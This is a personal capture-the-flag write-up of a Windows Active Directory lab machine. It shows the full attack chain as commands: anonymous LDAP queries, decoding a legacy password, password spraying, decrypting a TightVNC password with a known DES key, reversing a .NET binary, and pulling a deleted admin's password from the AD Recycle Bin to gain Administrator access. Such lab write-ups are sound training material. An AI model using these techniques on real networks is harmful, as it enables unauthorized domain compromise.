---
Status: Done
OS: Windows AD
Difficulty: Medium
tags:
  - SMB
  - TightVNC
  - ReverseEngineer
  - ldap
Date: 2026-07-06T11:34:00
Owned: 2026-07-06T18:05:00
---

---
# Enumeration
## port scan

![[Pasted image 20260706113724.png]]

# smb
anonymous, guest cant list shares  
can query user  
![[Pasted image 20260706114039.png]]
password policy  
![[Pasted image 20260706114158.png]]
checked  blanked password, username as password  
![[Pasted image 20260706114225.png]]
checked P@ssw0rd  
![[Pasted image 20260706114348.png]]
tested asreproast  
![[Pasted image 20260706114507.png]]

--rid-brute  
![[Pasted image 20260706114620.png]]
after filtering fot SidTypeUser the result is kinda the same as --users  

no SMBv1 -> can't EternalBlue  
![[Pasted image 20260706125941.png]]


# R.thompson
## LDAP
from hint we know it's in r.thompson  
```sh
nxc ldap 10.129.17.57 -u '' -p '' --query "(sAMAccountName=r.thompson)" ""
```
![[Pasted image 20260706130450.png]]
cascadeLegacyPwd
## fidgeting around
If we need to do it blindly with many users  
we might need to query all LDAP info at first the filter for something related to password exe. pwd, password, info, ...
```sh
ldapsearch -x -H ldap://10.129.17.57 -D '' -w '' -b "DC=cascade,DC=local"
```
![[Pasted image 20260706133014.png]]
for future reference we can loop through our users.txt  
```sh
while read -r u; do nxc ldap 10.129.17.57 -u '' -p '' --query "(sAMAccountName=$u)" ""; done < users.txt
```
we should scan through the result, but imma do a filter incase it might come handy in the future  
we might need to adjust the grep filter, cuz each envi may differ  

simple grep  get pwd/password/info but exclude usual field ex.pwdLastSet  
```
grep -Ei "pwd|password|info" ldapquery.txt | grep -Ev "badPwdCount|badPasswordTime|pwdLastSet"
```

![[Pasted image 20260706134046.png]]
we now know there is the field to get the owner of this field  
query for the cascadeLegacyPwd
```
nxc ldap 10.129.17.57 -u '' -p '' --query "(cascadeLegacyPwd=*)" ""
```
![[Pasted image 20260706134456.png]]
we get the r.thompson info  

# S.smith

spray the service with cred we found  
![[Pasted image 20260706134910.png]]
turn out it is invalid, we might need to decode it first, I think it is base64 encoded  
```sh
echo 'clk0bjVldmE=' | base64 -d
```
![[Pasted image 20260706135059.png]]
spray again  
```sh
nxcspray all 10.129.17.57 -u r.thompson -p 'rY4n5eva'
```
![[Pasted image 20260706135213.png]]
only SMB service, let's list the shares  
```sh
nxc smb 10.129.17.57 -u 'r.thompson' -p 'rY4n5eva' --shares
```
![[Pasted image 20260706135328.png]]
smell fishy here  
connect and list the content in `Data` shares  
```sh
impacket-smbclient cascade.local/r.thompson:'rY4n5eva'@10.129.17.57
```
![[Pasted image 20260706135512.png]]
there isn't option for impacket-smbclient to recurse and get all file in subdirectory  
idk just cat it  
![[Pasted image 20260706141218.png]]
from Steve to Ben  
TempAdmin use same password as normal admin  
they have GPO competition we might have to keep an eye out for this  

in the .log file it shows TempAdmin has been deleted  
![[Pasted image 20260706141419.png]]

try to ldap query info about TempAdmin  
![[Pasted image 20260706141551.png]]

Install.reg content  
![[Pasted image 20260706141741.png]]
there is password field which is stored in hex format  
![[Pasted image 20260706142327.png]]
kinda weird, just gonna note this  
after researching a bit, turn out the password need specific decryptor which use DES + key  
luckily I found this one https://github.com/frizb/PasswordDecrypts  
![[Pasted image 20260706143602.png]]
let's try the tool  

```sh
echo -n 6bcf2a4b6e5aca0f | xxd -r -p | openssl enc -des-cbc --nopad --nosalt -K e84ad660c4721ae0 -iv 0000000000000000 -d | hexdump -Cv
```
just replace the first blob with the hex password we found (remove the comma)  
![[Pasted image 20260706143718.png]]
sT333ve2  

we got password for TightVNC server  
Idk let's just spray this password for every user include the admin  
 
![[Pasted image 20260706143948.png]]
the password is valid for s.smith  
checking service  
![[Pasted image 20260706144250.png]]
this user can winrm  
![[Pasted image 20260706144411.png]]
get the user flag.  

# ArkSvc
priv and group enum  
![[Pasted image 20260706144531.png]]

s.smith can also read one more share `Audit$`
![[Pasted image 20260706144855.png]]
content in the share  
![[Pasted image 20260706145457.png]]
get the Audit.db  
we can open with sqllitebrowser  
![[Pasted image 20260706145951.png]]
base64 password for user ArkSvc  
couldn't decode seems weird  

reading hint we need to reverse the CascAudit.exe, we could use ILSpy for the .NET  
![[Pasted image 20260706154524.png]]
https://github.com/icsharpcode/AvaloniaILSpy
we can use this for ARM64
unzip the release then just run
```
./iLSpy
```
there is password DecryptString  
![[Pasted image 20260706154626.png]]
we need to reverse this to get the password  

took me very long looking for the DecryptString function, CascCrypto Lib.  
there aren't any decrypt function in the .exe  

the answer is in CascCrypto.dll that we have seen earlier  
![[Pasted image 20260706165154.png]]

now that we have encrypted password, key and IV we can reverse it and get plaintext  
![[Pasted image 20260706165442.png]]
w3lc0meFr31nd

don't forget this password is from ArkSvc user we found in the DB  
![[Pasted image 20260706165650.png]]

we still don't have permission to read Admin's dir  
![[Pasted image 20260706171858.png]]


# Administrator

## WinPEAS
run winpeas
found autologon credentials  
![[Pasted image 20260706172336.png]]


## Priv

![[Pasted image 20260706173633.png]]
enumerating priv and groups we found that there is `AD Recycle Bin` which we didn't have with other user we got earlier  

```powershell
Get-ADObject -ldapfilter "(&(isDeleted=TRUE))" -IncludeDeletedObject
```
found TempAdmin  
![[Pasted image 20260706175601.png]]
```
Get-ADObject -ldapfilter "(&(ObjectClass=User)(isDeleted=TRUE))" -IncludeDeletedObject
```
filter for user only  
![[Pasted image 20260706175649.png]]
```
Get-ADObject -ldapfilter "(&(ObjectClass=User)(isDeleted=TRUE)(DisplayName=TempAdmin))" -IncludeDeletedObject -Properties *
```
get property of TempUser  
![[Pasted image 20260706175920.png]]
![[Pasted image 20260706175942.png]]
baCT3r1aN00dles

we know earlier that password of admin is the same as TempAdmin  
```
evil-winrm -i 10.129.17.57 -u Administrator -p baCT3r1aN00dles
```

done!!  
![[Pasted image 20260706180143.png]]

![[Pasted image 20260706180221.png]]
